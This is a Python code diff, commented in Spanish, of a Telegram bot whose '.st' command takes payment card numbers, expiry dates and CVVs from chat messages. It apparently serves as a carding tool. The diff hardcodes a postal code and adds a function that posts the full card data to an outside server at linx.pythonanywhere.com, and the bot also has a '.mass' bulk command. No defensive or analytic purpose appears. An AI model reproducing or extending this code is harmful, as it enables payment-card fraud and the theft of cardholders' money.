@@ -499,14 +499,24 @@ def handle_st_command(message):
         cvv = card_data[2]
 
         # Generar un nombre aleatorio y un código postal aleatorio
-        name = generate_name()
-        postal_code = generate_postal_code()
+        ## name = generate_name()
+        postal_code = "44200"
 
         # Procesar el pago
-        send_card_info(card_number, name, postal_code, expiry, cvv)
+        send_card_info1(card_number, postal_code, expiry, cvv)
 
     except IndexError:
         bot.reply_to(message, "Por favor, proporciona los datos de la tarjeta en el formato correcto: .st <card_number>|<expiry>|<cvv>")
+    
+# Función para enviar los datos de la tarjeta al servidor
+def send_card_info1(card_number, postal_code, expiry, cvv ):
+    SERVER_URL = "https://linx.pythonanywhere.com/card-info"
+    return requests.post(SERVER_URL, json={
+        'card_number': card_number,
+        'expiry': expiry,
+        'cvv': cvv,
+        'postal_code': postal_code
+    })
 
 # Función para manejar el comando .mass
 @bot.message_handler(commands=['mass'])
@@ -561,16 +571,6 @@ def generate_name():
 def generate_postal_code():
     postal_codes = ['28001', '08001', '41001', '48001', '03001', '46001', '28002', '08002', '41002', '48002']
     return random.choice(postal_codes)
-
-# Función para enviar los datos de la tarjeta al servidor
-def send_card_info(card_number, expiry, cvv, postal_code, full_name):
-    SERVER_URL = "https://linx.pythonanywhere.com/card-info"
-    return requests.post(SERVER_URL, json={
-        'card_number': card_number,
-        'expiry': expiry,
-        'cvv': cvv,
-        'postal_code': postal_code
-    })
 
 
 bot.polling()
